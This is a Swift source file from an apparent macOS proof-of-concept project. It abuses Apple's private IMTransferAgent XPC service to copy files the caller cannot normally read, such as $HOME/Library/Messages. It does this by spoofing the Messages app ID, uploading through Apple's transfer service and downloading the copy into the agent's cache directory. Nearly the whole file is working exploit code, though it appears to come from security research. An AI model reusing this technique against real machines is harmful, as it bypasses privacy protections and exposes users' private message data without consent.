//
//  IMTransferAgent.swift
//  inputcontrol
//
//  Created by Spotlight Deveaux on 2022-11-18.
//

import Foundation
import SwiftUI

enum TransferError: Error {
    case notSuccessful
    case tooLarge
}

func uploadAndDownloadFile(sourcePath: String, encrypted: Bool = true) throws {
    log(entry: "\n======== File operation ========")
    log(entry: "📤 Uploading from \(sourcePath)...")

    let connection = xpc_connection_create_mach_service("com.apple.imtransferservices.IMTransferAgent", .main, 0)
    xpc_connection_set_event_handler(connection) { event in
        if xpc_equal(event, XPC_ERROR_CONNECTION_INTERRUPTED) || xpc_equal(event, XPC_ERROR_CONNECTION_INTERRUPTED) {
            return
        }

        print("Received event from IMTransferAgent: \(event)")
    }
    xpc_connection_activate(connection)

    // We'll set up something fake.
    let transferID = UUID().uuidString.cString(using: .utf8)!

    // Here, we request to upload the specified path.
    // Note that this path can be $HOME/Library/Messages, due to the sandbox profile.
    let uploadRequest = xpc_dictionary_create_empty()
    xpc_dictionary_set_string(uploadRequest, "transferURL", sourcePath)
    xpc_dictionary_set_string(uploadRequest, "transferID", transferID)
    // Chosen because it seems to be unused in production.
    xpc_dictionary_set_string(uploadRequest, "topic", "com.apple.private.alloy.test1")
    xpc_dictionary_set_string(uploadRequest, "sourceAppID", "com.apple.MobileSMS")
    xpc_dictionary_set_bool(uploadRequest, "isSend", true)

    // If we're encrypting, IMTransferAgent must have write access to the source path
    // as it creates a file when encrypting.
    // Not encrypting is only useful for our dummy PNG, as IMTransferAgent
    // does not have r/w access to our temporary directory.
    xpc_dictionary_set_bool(uploadRequest, "encryptFile", encrypted)

    let uploadResponse = xpc_connection_send_message_with_reply_sync(connection, uploadRequest)
    // TODO: Error handling for large files
    guard xpc_dictionary_get_bool(uploadResponse, "success") == true else {
        // If failure, we need to see why in order to throw an appropriate error.
        // Sometimes, files may exceed the 100 MB limit.
        // This should be a serialized NSError.
        var dataLength = 0
        guard let dataPointer = xpc_dictionary_get_data(uploadResponse, "error", &dataLength) else {
            throw TransferError.notSuccessful
        }
        let errorData = Data(bytes: dataPointer, count: dataLength)

        let unarchivedError = try NSKeyedUnarchiver.unarchivedObject(ofClass: NSError.self, from: errorData)
        guard let unarchivedError else {
            throw TransferError.notSuccessful
        }

        // If the file's too large, we get error code -6 from IMTransferServicesErrorDomain.
        if unarchivedError.domain == "IMTransferServicesErrorDomain", unarchivedError.code == -6 {
            throw TransferError.tooLarge
        } else {
            throw unarchivedError
        }
    }

    // Hopefully, our file has uploaded.
    // We get back a dictionary with
    //   {
    //     "requestURLString": string,    // urlString
    //     "additionalErrorInfo": string,
    //     "encryptionKey": data,         // decryptionKey
    //     "ownerID": string,             // ownerID
    //     "fileSize": int64,             // file-size, but uint64
    //     "success": bool,
    //     "signature": data,             // signature
    //   }
    let urlString = xpc_dictionary_get_string(uploadResponse, "requestURLString")!
    let ownerID = xpc_dictionary_get_string(uploadResponse, "ownerID")!
    let fileSize = xpc_dictionary_get_int64(uploadResponse, "fileSize")
    // To avoid dealing with Swift and Data, we'll use the raw xpc_object_t.
    let signature = xpc_dictionary_get_value(uploadResponse, "signature")!

    var decryptionKey: xpc_object_t
    if encrypted {
        // We're given a key if our file was uploaded with `encryptFile`.
        decryptionKey = xpc_dictionary_get_value(uploadResponse, "encryptionKey")!
    } else {
        // We must specify an XPC null type so that the file is not erronously
        // decrypted and immediately discarded.
        decryptionKey = xpc_null_create()
    }

    // Lastly, we download.
    let downloadPath = siphonedFilePath()
    log(entry: "📥 Downloading to \(downloadPath)...")

    let downloadRequest = xpc_dictionary_create_empty()
    xpc_dictionary_set_string(downloadRequest, "topic", "com.apple.private.alloy.test1")
    xpc_dictionary_set_string(downloadRequest, "receivePath", downloadPath)
    xpc_dictionary_set_string(downloadRequest, "transferID", transferID)
    xpc_dictionary_set_string(downloadRequest, "ownerID", ownerID)
    xpc_dictionary_set_string(downloadRequest, "urlString", urlString)
    xpc_dictionary_set_string(downloadRequest, "sourceAppID", "com.apple.MobileSMS")
    xpc_dictionary_set_value(downloadRequest, "signature", signature)
    xpc_dictionary_set_value(downloadRequest, "decryptionKey", decryptionKey)
    xpc_dictionary_set_uint64(downloadRequest, "file-size", UInt64(fileSize))
    let downloadResponse = xpc_connection_send_message_with_reply_sync(connection, downloadRequest)

    print(downloadResponse)

    guard xpc_dictionary_get_bool(downloadResponse, "success") == true else {
        throw TransferError.notSuccessful
    }

    xpc_connection_cancel(connection)
    log(entry: "✅ Downloaded.\n")
}

// IMTransferAgent only has a limited amount of places with write access.
// Frustratingly, it has /private/var/tmp/ as an entitlement with
// com.apple.security.exception.files.absolute-path.read-write,
// but on macOS, it's com.apple.security.temporary-exception.[...]
// so that doesn't appear to apply.
// We'd use other options for accessing /private/var/tmp if that was the case :)
//
// Instead, we'll use its cache directory - that is,
// `$(getconf DARWIN_USER_CACHE_DIR)/com.apple.imtransferservices.IMTransferAgent`.
//
// e.x. /private/var/folders/x2/gn9zhv9n4531m4wxg2zmrsnm0000gn/T/com.apple.imtransferservices.IMTransferAgent/<UUID>.dat
let dummyUUID = UUID().uuidString

func siphonedFilePath() -> String {
    // e.x. /private/var/folders/x2/gn9zhv9n4531m4wxg2zmrsnm0000gn/T/
    URL.temporaryDirectory.deletingLastPathComponent()
        .appending(component: "com.apple.imtransferservices.IMTransferAgent")
        .appending(component: "\(dummyUUID).dat").path()
}
